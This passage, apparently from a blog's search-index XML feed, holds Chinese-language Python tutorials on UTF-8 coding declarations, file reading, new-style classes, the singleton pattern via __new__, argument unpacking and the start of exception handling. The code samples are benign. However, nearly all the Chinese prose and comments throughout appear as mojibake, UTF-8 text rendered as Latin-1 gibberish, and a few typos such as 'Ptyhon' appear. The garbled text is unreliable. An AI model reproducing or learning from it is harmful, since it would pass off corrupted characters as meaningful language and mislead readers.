ä¸ªå­—èŠ‚</strong> æ¥è¡¨ç¤ºä¸€ä¸ª<code>UTF-8</code> å­—ç¬¦ï¼Œæ¶µç›–äº†<strong>åœ°çƒä¸Šå‡ ä¹æ‰€æœ‰åœ°åŒºçš„æ–‡å­—</strong></li><li>å¤§å¤šæ•°æ±‰å­—ä¼šä½¿ç”¨ <strong>3 ä¸ªå­—èŠ‚</strong> è¡¨ç¤º</li><li><code>UTF-8</code> æ˜¯ <code>UNICODE</code> ç¼–ç çš„ä¸€ç§ç¼–ç æ ¼å¼</li></ul><h3 id="ptyhon-2.x-ä¸­å¦‚ä½•ä½¿ç”¨ä¸­æ–‡">4.2 Ptyhon 2.x ä¸­å¦‚ä½•ä½¿ç”¨ä¸­æ–‡</h3><blockquote><p>Python 2.x é»˜è®¤ä½¿ç”¨ <code>ASCII</code> ç¼–ç æ ¼å¼ Python 3.x é»˜è®¤ä½¿ç”¨<code>UTF-8</code> ç¼–ç æ ¼å¼</p></blockquote><ul><li>åœ¨ Python 2.x æ–‡ä»¶çš„ <strong>ç¬¬ä¸€è¡Œ</strong>å¢åŠ ä»¥ä¸‹ä»£ç ï¼Œè§£é‡Šå™¨ä¼šä»¥ <code>utf-8</code> ç¼–ç æ¥å¤„ç† python æ–‡ä»¶</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *-* coding:utf8 *-*</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™æ–¹å¼æ˜¯å®˜æ–¹æ¨èä½¿ç”¨çš„ï¼</p></blockquote><ul><li>ä¹Ÿå¯ä»¥ä½¿ç”¨</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br></pre></td></tr></table></figure><h4 id="unicode-å­—ç¬¦ä¸²">unicode å­—ç¬¦ä¸²</h4><ul><li>åœ¨ <code>Python 2.x</code> ä¸­ï¼Œå³ä½¿æŒ‡å®šäº†æ–‡ä»¶ä½¿ç”¨ <code>UTF-8</code>çš„ç¼–ç æ ¼å¼ï¼Œä½†æ˜¯åœ¨éå†å­—ç¬¦ä¸²æ—¶ï¼Œä»ç„¶ä¼š <strong>ä»¥å­—èŠ‚ä¸ºå•ä½éå†</strong>å­—ç¬¦ä¸²</li><li>è¦èƒ½å¤Ÿ <strong>æ­£ç¡®çš„éå†å­—ç¬¦ä¸²</strong>ï¼Œåœ¨å®šä¹‰å­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦<strong>åœ¨å­—ç¬¦ä¸²çš„å¼•å·å‰</strong>ï¼Œå¢åŠ ä¸€ä¸ªå°å†™å­—æ¯<code>u</code>ï¼Œå‘Šè¯‰è§£é‡Šå™¨è¿™æ˜¯ä¸€ä¸ª <code>unicode</code> å­—ç¬¦ä¸²ï¼ˆä½¿ç”¨<code>UTF-8</code> ç¼–ç æ ¼å¼çš„å­—ç¬¦ä¸²ï¼‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *-* coding:utf8 *-*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å­—ç¬¦ä¸²å‰ï¼Œå¢åŠ ä¸€ä¸ª `u` è¡¨ç¤ºè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸€ä¸ª utf8 å­—ç¬¦ä¸²</span></span><br><span class="line">hello_str = <span class="string">u&quot;ä½ å¥½ä¸–ç•Œ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hello_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> hello_str:</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><h2 id="å°ç»“">å°ç»“</h2><h3 id="è¯»å–çš„æ–¹æ³•">è¯»å–çš„æ–¹æ³•</h3><ol type="1"><li>read()å°†æ‰€æœ‰å†…å®¹è¯»åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰ã€‚å¯ä»¥åŠ å‚æ•°ï¼ŒæŒ‡å®šè¦è¯»å¤šå°‘ä¸ªå­—ç¬¦</li><li>readline() ä¸€è¡Œä¸€è¡Œè¯»å–ï¼ŒåŒ…æ‹¬ </li><li>readlines(ï¼‰å°†æ‰€æœ‰å†…å®¹ï¼ŒæŒ‰ç…§è¡Œï¼Œåˆ†åˆ°åˆ—è¡¨ä¸­</li><li>seek(arg) å®šä½æŒ‡é’ˆ seek(0ï¼‰ å°†æ–‡ä»¶æµæŒ‡é’ˆå®šä½åˆ°æ–‡ä»¶é¦–ã€‚</li></ol><p>å¸¸ç”¨è¯»å–æ–¹æ³•ï¼š</p><ol type="1"><li>for å¾ªç¯ä¸ readlines è¿­ä»£</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">  <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¯»å–çš„æ–‡ä»¶æ¯è¡Œæœ«å°¾æœ‰<code>\n</code>ï¼Œè€Œ printæ‰“å°çš„æ—¶å€™ï¼Œé»˜è®¤åˆä¼šæ‰“å°ä¸€ä¸ª<code>\n</code>ã€‚æ‰€ä»¥<strong>æœ€å¥½çš„æ–¹æ³•æ˜¯è®©print ä¸æ‰“å° <code>\n</code>ã€‚</strong></p><p>æˆ–è€…é€šè¿‡å­—ç¬¦ä¸²çš„ <code>strip()</code> æ–¹æ³•ï¼ˆé»˜è®¤å»æ‰ whitespaceï¼ŒåŒ…æ‹¬<code>\t,\r,\n</code>ï¼Œç©ºæ ¼ï¼‰å°†æ–‡ä»¶ä¸­æ¯ä¸€è¡Œæœ«å°¾çš„ <code>\n</code>ï¼ˆLinuxï¼‰æˆ– <code>\r\n</code> ï¼ˆWindowsï¼‰å»é™¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">  <span class="built_in">print</span>(i.strip())</span><br></pre></td></tr></table></figure><h2 id="æ–°å¼ç±»ä¸æ—§å¼ç»å…¸ç±»">æ–°å¼ç±»ä¸æ—§å¼ï¼ˆç»å…¸ï¼‰ç±»</h2><blockquote><p><code>objec</code> æ˜¯ <code>Python</code>ä¸ºæ‰€æœ‰å¯¹è±¡æä¾›çš„<strong>åŸºç±»</strong>ï¼Œæä¾›æœ‰ä¸€äº›å†…ç½®çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨<code>dir</code>å‡½æ•°æŸ¥çœ‹</p></blockquote><ul><li><p>æ–°å¼ç±»ï¼šä»¥ <code>object</code>ä¸ºåŸºç±»çš„ç±»ï¼Œæ¨èä½¿ç”¨</p></li><li><p>ç»å…¸ç±»ï¼šä¸ä»¥ <code>object</code>ä¸ºåŸºç±»çš„ç±»ï¼Œä¸æ¨èä½¿ç”¨</p></li><li><p>åœ¨ <code>Python3, x</code>ä¸­å®šä¹‰ç±»æ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šçˆ¶ç±»ï¼Œä¼š<strong>é»˜è®¤ä½¿ç”¨</strong><code>object</code> ä½œä¸ºè¯¥ç±»çš„<strong>åŸºç±»</strong>.</p><p>Python3, x ä¸­å®šä¹‰çš„ç±»éƒ½æ˜¯æ–°å¼ç±»</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python single instance</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/py_single_instance/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/py_single_instance/</url>
      
        <content type="html"><![CDATA[<h2 id="å•ä¾‹è®¾è®¡æ¨¡å¼">å•ä¾‹è®¾è®¡æ¨¡å¼</h2><ul><li>è®¾è®¡æ¨¡å¼<ul><li><strong>è®¾è®¡æ¨¡å¼</strong> æ˜¯<strong>å‰äººå·¥ä½œçš„æ€»ç»“å’Œæç‚¼</strong>ï¼Œé€šå¸¸ï¼Œè¢«äººä»¬å¹¿æ³›æµä¼ çš„è®¾è®¡æ¨¡å¼éƒ½æ˜¯é’ˆå¯¹<strong>æŸä¸€ç‰¹å®šé—®é¢˜</strong> çš„æˆç†Ÿçš„è§£å†³æ–¹æ¡ˆ</li><li>ä½¿ç”¨ <strong>è®¾è®¡æ¨¡å¼</strong>æ˜¯ä¸ºäº†å¯é‡ç”¨ä»£ç ã€è®©ä»£ç æ›´å®¹æ˜“è¢«ä»–äººç†è§£ã€ä¿è¯ä»£ç å¯é æ€§</li></ul></li><li>å•ä¾‹è®¾è®¡æ¨¡å¼<ul><li><strong>ç›®çš„</strong> â€”â€” è®© <strong>ç±»</strong> åˆ›å»ºçš„å¯¹è±¡ï¼Œåœ¨ç³»ç»Ÿä¸­<strong>åªæœ‰</strong> <strong>å”¯ä¸€çš„ä¸€ä¸ªå®ä¾‹</strong></li><li>æ¯ä¸€æ¬¡æ‰§è¡Œ <code>ç±»å()</code>è¿”å›çš„å¯¹è±¡ï¼Œ<strong>å†…å­˜åœ°å€æ˜¯ç›¸åŒçš„</strong></li></ul></li></ul><h3 id="å•ä¾‹è®¾è®¡æ¨¡å¼çš„åº”ç”¨åœºæ™¯">å•ä¾‹è®¾è®¡æ¨¡å¼çš„åº”ç”¨åœºæ™¯</h3><ul><li><strong>éŸ³ä¹æ’­æ”¾</strong> å¯¹è±¡</li><li><strong>å›æ”¶ç«™</strong> å¯¹è±¡</li><li><strong>æ‰“å°æœº</strong> å¯¹è±¡</li><li>â€¦â€¦</li></ul><h2 id="new__-æ–¹æ³•">02. <code>__new__</code> æ–¹æ³•</h2><ul><li>ä½¿ç”¨ <strong>ç±»å()</strong> åˆ›å»ºå¯¹è±¡æ—¶ï¼Œ<code>Python</code>çš„è§£é‡Šå™¨ <strong>é¦–å…ˆ</strong> ä¼š è°ƒç”¨ <code>__new__</code> æ–¹æ³•ä¸ºå¯¹è±¡<strong>åˆ†é…ç©ºé—´</strong></li><li><code>__new__</code> æ˜¯ä¸€ä¸ªç”± <code>object</code>åŸºç±»æä¾›çš„å†…ç½®çš„é™æ€æ–¹æ³•ï¼Œä¸»è¦ä½œç”¨æœ‰ä¸¤ä¸ªï¼š<ul><li><ol type="1"><li>åœ¨å†…å­˜ä¸­ä¸ºå¯¹è±¡ <strong>åˆ†é…ç©ºé—´</strong></li></ol></li><li><ol start="2" type="1"><li><strong>è¿”å›</strong> å¯¹è±¡çš„å¼•ç”¨</li></ol></li></ul></li><li><code>Python</code> çš„è§£é‡Šå™¨è·å¾—å¯¹è±¡çš„ <strong>å¼•ç”¨</strong>åï¼Œå°†å¼•ç”¨ä½œä¸º <strong>ç¬¬ä¸€ä¸ªå‚æ•°</strong>ï¼Œä¼ é€’ç»™ <code>__init__</code>æ–¹æ³•</li></ul><blockquote><p>é‡å†™ <code>__new__</code> æ–¹æ³• çš„ä»£ç éå¸¸å›ºå®šï¼</p></blockquote><ul><li>é‡å†™ <code>__new__</code> æ–¹æ³• <strong>ä¸€å®šè¦</strong><code>return super().__new__(cls)</code></li><li>å¦åˆ™ Python çš„è§£é‡Šå™¨ <strong>å¾—ä¸åˆ°</strong> åˆ†é…äº†ç©ºé—´çš„<strong>å¯¹è±¡å¼•ç”¨</strong>ï¼Œ<strong>å°±ä¸ä¼šè°ƒç”¨å¯¹è±¡çš„åˆå§‹åŒ–æ–¹æ³•</strong></li><li>æ³¨æ„ï¼š<code>__new__</code> æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œåœ¨è°ƒç”¨æ—¶éœ€è¦<strong>ä¸»åŠ¨ä¼ é€’</strong> <code>cls</code> å‚æ•°</li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203211584756399791.png"alt="new" /><figcaption aria-hidden="true"><strong>new</strong></figcaption></figure><p><strong>ç¤ºä¾‹ä»£ç </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MusicPlayer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># å¦‚æœä¸è¿”å›ä»»ä½•ç»“æœï¼Œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;åˆå§‹åŒ–éŸ³ä¹æ’­æ”¾å¯¹è±¡&quot;</span>)</span><br><span class="line"></span><br><span class="line">player = MusicPlayer()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(player)</span><br></pre></td></tr></table></figure><h2 id="python-ä¸­çš„å•ä¾‹">03. Python ä¸­çš„å•ä¾‹</h2><ul><li><p>å•ä¾‹</p><p>â€”â€” è®©ç±» åˆ›å»ºçš„å¯¹è±¡ï¼Œåœ¨ç³»ç»Ÿä¸­åªæœ‰å”¯ä¸€çš„ä¸€ä¸ªå®ä¾‹</p><ol type="1"><li>å®šä¹‰ä¸€ä¸ª <strong>ç±»å±æ€§</strong>ï¼Œåˆå§‹å€¼æ˜¯<code>None</code>ï¼Œç”¨äºè®°å½• <strong>å•ä¾‹å¯¹è±¡çš„å¼•ç”¨</strong></li><li>é‡å†™ <code>__new__</code> æ–¹æ³•</li><li>å¦‚æœ <strong>ç±»å±æ€§</strong><code>is None</code>ï¼Œè°ƒç”¨çˆ¶ç±»æ–¹æ³•åˆ†é…ç©ºé—´ï¼Œå¹¶åœ¨ç±»å±æ€§ä¸­è®°å½•ç»“æœ</li><li>è¿”å› <strong>ç±»å±æ€§</strong> ä¸­è®°å½•çš„ <strong>å¯¹è±¡å¼•ç”¨</strong></li></ol></li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203211584756337404.png"alt="å•ä¾‹" /><figcaption aria-hidden="true">å•ä¾‹</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MusicPlayer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å®šä¹‰ç±»å±æ€§è®°å½•å•ä¾‹å¯¹è±¡å¼•ç”¨</span></span><br><span class="line">    instance = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. åˆ¤æ–­ç±»å±æ€§æ˜¯å¦å·²ç»è¢«èµ‹å€¼</span></span><br><span class="line">        <span class="keyword">if</span> cls.instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            cls.instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. è¿”å›ç±»å±æ€§çš„å•ä¾‹å¼•ç”¨</span></span><br><span class="line">        <span class="keyword">return</span> cls.instance</span><br></pre></td></tr></table></figure><h3 id="åªæ‰§è¡Œä¸€æ¬¡åˆå§‹åŒ–å·¥ä½œ">åªæ‰§è¡Œä¸€æ¬¡åˆå§‹åŒ–å·¥ä½œ</h3><ul><li>åœ¨æ¯æ¬¡ä½¿ç”¨ ç±»å() åˆ›å»ºå¯¹è±¡æ—¶ï¼ŒPython çš„è§£é‡Šå™¨éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨ä¸¤ä¸ªæ–¹æ³•ï¼š<ul><li><code>__new__</code> åˆ†é…ç©ºé—´</li><li><code>__init__</code> å¯¹è±¡åˆå§‹åŒ–</li></ul></li><li>åœ¨ä¸Šä¸€å°èŠ‚å¯¹ <code>__new__</code> æ–¹æ³•æ”¹é€ ä¹‹åï¼Œæ¯æ¬¡éƒ½ä¼šå¾—åˆ°<strong>ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºå¯¹è±¡çš„å¼•ç”¨</strong></li><li>ä½†æ˜¯ï¼š<strong>åˆå§‹åŒ–æ–¹æ³•è¿˜ä¼šè¢«å†æ¬¡è°ƒç”¨</strong></li></ul><p><strong>éœ€æ±‚</strong></p><ul><li>è®© <strong>åˆå§‹åŒ–åŠ¨ä½œ</strong> åªè¢« <strong>æ‰§è¡Œä¸€æ¬¡</strong></li></ul><p><strong>è§£å†³åŠæ³•</strong></p><ol type="1"><li>å®šä¹‰ä¸€ä¸ªç±»å±æ€§ <code>init_flag</code> æ ‡è®°æ˜¯å¦<strong>æ‰§è¡Œè¿‡åˆå§‹åŒ–åŠ¨ä½œ</strong>ï¼Œåˆå§‹å€¼ä¸º <code>False</code></li><li>åœ¨ <code>__init__</code> æ–¹æ³•ä¸­ï¼Œåˆ¤æ–­ <code>init_flag</code>ï¼Œå¦‚æœä¸º<code>False</code> å°±æ‰§è¡Œåˆå§‹åŒ–åŠ¨ä½œ</li><li>ç„¶åå°† <code>init_flag</code> è®¾ç½®ä¸º <code>True</code></li><li>è¿™æ ·ï¼Œå†æ¬¡ <strong>è‡ªåŠ¨</strong> è°ƒç”¨ <code>__init__</code>æ–¹æ³•æ—¶ï¼Œ<strong>åˆå§‹åŒ–åŠ¨ä½œå°±ä¸ä¼šè¢«å†æ¬¡æ‰§è¡Œ</strong> äº†</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MusicPlayer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®°å½•ç¬¬ä¸€ä¸ªè¢«åˆ›å»ºå¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line">    instance = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># è®°å½•æ˜¯å¦æ‰§è¡Œè¿‡åˆå§‹åŒ–åŠ¨ä½œ</span></span><br><span class="line">    init_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. åˆ¤æ–­ç±»å±æ€§æ˜¯å¦æ˜¯ç©ºå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> cls.instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 2. è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•ï¼Œä¸ºç¬¬ä¸€ä¸ªå¯¹è±¡åˆ†é…ç©ºé—´</span></span><br><span class="line">            cls.instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. è¿”å›ç±»å±æ€§ä¿å­˜çš„å¯¹è±¡å¼•ç”¨</span></span><br><span class="line">        <span class="keyword">return</span> cls.instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#  1. åˆ¤æ–­æ˜¯å¦æ‰§è¡Œè¿‡åˆå§‹åŒ–åŠ¨ä½œ</span></span><br><span class="line">        <span class="keyword">if</span> MusicPlayer.init_flag:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. å¦‚æœæ²¡æœ‰æ‰§è¡Œè¿‡,åˆ™æ‰§è¡Œåˆå§‹åŒ–åŠ¨ä½œ</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;åˆå§‹åŒ–æ’­æ”¾å™¨&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. æ‰§è¡Œåˆå§‹åŒ–åŠ¨ä½œä¹‹å,ä¿®æ”¹ç±»å±æ€§çš„æ ‡è®°</span></span><br><span class="line">        MusicPlayer.init_flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¤šä¸ªå¯¹è±¡</span></span><br><span class="line">player1 = MusicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player1)</span><br><span class="line"></span><br><span class="line">player2 = MusicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player2)</span><br></pre></td></tr></table></figure><h1 id="çŸ¥è¯†ç‚¹è¡¥å……">çŸ¥è¯†ç‚¹è¡¥å……</h1><p><ahref="https://blog.csdn.net/qq_41780295/article/details/89112376">Pythonå­¦ä¹ ï¼šå¤šå€¼å‚æ•° ä»¥åŠ å…ƒç»„å’Œå­—å…¸çš„æ‹†åŒ…</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">num, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tup = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;å°æ˜&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">178</span>&#125;</span><br><span class="line">demo(<span class="number">1</span>, *tup, **dic)</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;å°æ˜&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;weight&#x27;</span>: <span class="number">178</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python exception handling</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/exception/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/exception/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¦‚å¿µ">æ¦‚å¿µ</h2><ul><li>ç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œå¦‚æœ Pythonè§£é‡Šå™¨<strong>é‡åˆ°</strong>ä¸€ä¸ªé”™è¯¯ï¼Œ<strong>ä¼šåœæ­¢ç¨‹åºçš„æ‰§è¡Œï¼Œå¹¶ä¸”æç¤ºä¸€äº›é”™è¯¯ä¿¡æ¯</strong>ï¼Œè¿™å°±æ˜¯<strong>å¼‚å¸¸</strong></li><li><strong>ç¨‹åºåœæ­¢æ‰§è¡Œå¹¶ä¸”æç¤ºé”™è¯¯ä¿¡æ¯</strong>è¿™ä¸ªåŠ¨ä½œï¼Œæˆ‘ä»¬é€šå¸¸ç§°ä¹‹ä¸ºï¼š<strong>æŠ›å‡ºï¼ˆraiseï¼‰å¼‚å¸¸</strong></li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203211584756455085.png"alt="exception" /><figcaption aria-hidden="true">exception</figcaption></figure><p>ç¨‹åºå¼€å‘æ—¶ï¼Œå¾ˆéš¾å°†<strong>æ‰€æœ‰çš„ç‰¹æ®Šæƒ…å†µ</strong>éƒ½å¤„ç†çš„é¢é¢ä¿±åˆ°ï¼Œé€šè¿‡<strong>å¼‚å¸¸æ•è·</strong>å¯ä»¥é’ˆå¯¹çªå‘äº‹ä»¶å€£é›†ä¸­çš„å¤„ç†ï¼Œä»è€Œä¿è¯ç¨‹åºçš„<strong>ç¨³å®šæ€§å’Œå¥å£¯æ€§</strong></p><h2 id="æ•è·å¼‚å¸¸">æ•è·å¼‚å¸¸</h2><p>åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œå¦‚æœ<strong>å¯¹æŸäº›ä»£ç çš„æ‰§è¡Œä¸èƒ½ç¡®å®šæ˜¯å¦æ­£ç¡®</strong>ï¼Œå¯ä»¥å¢åŠ <code>try(å°è¯•)</code> æ¥ <strong>æ•è·å¼‚å¸¸</strong></p><ul><li><code>try</code><strong>å°è¯•</strong>ï¼Œä¸‹æ–¹ç¼–å†™è¦å°è¯•ä»£ç ï¼Œä¸ç¡®å®šæ˜¯å¦èƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œçš„ä»£ç </li><li><code>except</code><strong>å¦‚æœä¸æ˜¯</strong>ï¼Œä¸‹æ–¹ç¼–å†™å°è¯•å¤±è´¥çš„ä»£ç </li></ul><h3 id="é”™è¯¯ç±»å‹æ•è·">é”™è¯¯ç±»å‹æ•è·</h3><ul><li>åœ¨ç¨‹åºæ‰§è¡Œæ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ° <strong>ä¸åŒç±»å‹çš„å¼‚å¸¸</strong>ï¼Œå¹¶ä¸”éœ€è¦<strong>é’ˆå¯¹ä¸åŒç±»å‹çš„å¼‚å¸¸ï¼Œåšå‡ºä¸åŒçš„å“åº”</strong>ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±éœ€è¦æ•è·é”™è¯¯ç±»å‹äº†</li><li>programming æ ¹æ®å¼•å‘å¼‚å¸¸çš„åŸå› ï¼Œå°†å¼‚å¸¸åˆ†ä¸ºäº†å¾ˆå¤šç§ä¸åŒç±»åˆ«ï¼Œåœ¨except å­å¥ä¸­å¯ä»¥åˆ†åˆ«æ•è·æŒ‡å®šç±»åˆ«çš„å¼‚å¸¸ã€‚</li><li>è¯­æ³•å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># å°è¯•æ‰§è¡Œçš„ä»£ç </span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> é”™è¯¯ç±»å‹<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># é’ˆå¯¹é”™è¯¯ç±»å‹1ï¼Œå¯¹åº”çš„ä»£ç å¤„ç†</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> (é”™è¯¯ç±»å‹<span class="number">2</span>, é”™è¯¯ç±»å‹<span class="number">3</span>):</span><br><span class="line">    <span class="comment"># é’ˆå¯¹é”™è¯¯ç±»å‹2 å’Œ 3ï¼Œå¯¹åº”çš„ä»£ç å¤„ç†</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æœªçŸ¥é”™è¯¯ %s&quot;</span> % 